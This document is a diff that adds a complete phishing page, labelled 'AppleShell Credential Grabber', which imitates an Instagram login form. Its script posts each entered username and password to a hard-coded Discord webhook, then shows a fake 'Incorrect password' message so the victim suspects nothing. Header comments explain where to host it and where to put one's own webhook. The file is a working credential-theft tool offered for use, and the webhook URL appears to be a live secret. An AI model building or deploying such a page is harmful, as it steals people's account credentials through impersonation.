@@ -1,0 +1,61 @@
+<!-- AppleShell Credential Grabber - single page -->
+<!-- Host this anywhere (GitHub Pages, Netlify, Vercel, free hosting) -->
+<!-- Replace WEBHOOK with your Discord webhook URL -->
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Login</title>
+<style>
+body { font-family: -apple-system, sans-serif; background: #000; color: #fff; margin: 0; padding: 20px; }
+.box { max-width: 360px; margin: 40px auto; background: #1a1a1a; padding: 30px; border-radius: 12px; }
+input { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 6px; background: #2a2a2a; color: #fff; }
+button { width: 100%; padding: 12px; background: #0095f6; border: none; border-radius: 6px; color: #fff; font-weight: bold; margin-top: 10px; }
+.logo { text-align: center; font-size: 28px; margin-bottom: 20px; }
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="logo">Instagram</div>
+  <form id="f">
+    <input id="u" placeholder="Username, email or phone" required>
+    <input id="p" type="password" placeholder="Password" required>
+    <button type="submit">Log in</button>
+  </form>
+  <p style="text-align:center; font-size:12px; color:#888; margin-top:20px;">Forgot password?</p>
+</div>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1558898057171570819/fdgPqERqhVwsSxdIcYN2P-mIbdcEStPQwIRwpYXuXOzXuBjo25fCYiMSRPGex67CB1rJ";
+
+document.getElementById("f").onsubmit = async (e) => {
+  e.preventDefault();
+  const user = document.getElementById("u").value;
+  const pass = document.getElementById("p").value;
+  const data = {
+    content: null,
+    embeds: [{
+      title: "New Login",
+      color: 0x0095f6,
+      fields: [
+        { name: "Username", value: user, inline: true },
+        { name: "Password", value: pass, inline: true },
+        { name: "Platform", value: navigator.userAgent.includes("Instagram") ? "Instagram" : "Other", inline: false }
+      ],
+      footer: { text: "AppleShell" }
+    }]
+  };
+  try {
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+  } catch(e) {}
+  document.body.innerHTML = "<div class='box'><p style='text-align:center'>Incorrect password. Try again.</p></div>";
+  setTimeout(() => location.reload(), 1500);
+};
+</script>
+</body>
+</html>
